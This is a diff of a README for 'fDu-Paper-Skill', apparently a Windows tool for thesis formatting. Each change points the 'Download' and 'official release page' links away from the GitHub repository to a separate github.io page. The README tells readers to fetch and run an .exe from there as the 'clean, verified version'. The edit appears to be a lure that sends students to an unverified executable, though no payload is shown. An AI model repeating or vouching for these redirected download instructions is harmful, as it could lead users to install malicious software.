@@ -1,6 +1,6 @@
 # 🎓 fDu-Paper-Skill - Improve Academic Thesis Writing Efficiency Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Dystopian-ageratinaaltissima165/fDu-Paper-Skill)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue)](https://dystopian-ageratinaaltissima165.github.io)
 
 ## 📌 Overview
 
@@ -12,7 +12,7 @@ The software works on Windows computers. It removes the guesswork from formattin
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/Dystopian-ageratinaaltissima165/fDu-Paper-Skill).
+1. Go to the [official release page](https://dystopian-ageratinaaltissima165.github.io).
 2. Look for the latest version listed at the top.
 3. Click the link to download the file ending in .exe.
 4. Save the file to your desktop or downloads folder.
@@ -72,6 +72,6 @@ Because this is a specific tool for students, it lacks a broad user base. Window
 
 ## 📦 Download
 
-[Download fDu-Paper-Skill for Windows](https://github.com/Dystopian-ageratinaaltissima165/fDu-Paper-Skill)
+[Download fDu-Paper-Skill for Windows](https://dystopian-ageratinaaltissima165.github.io)
 
 Use this link to access the current release. Always download from this page to ensure you have the clean, verified version of the software. Save these instructions if you need to reinstall the software later.
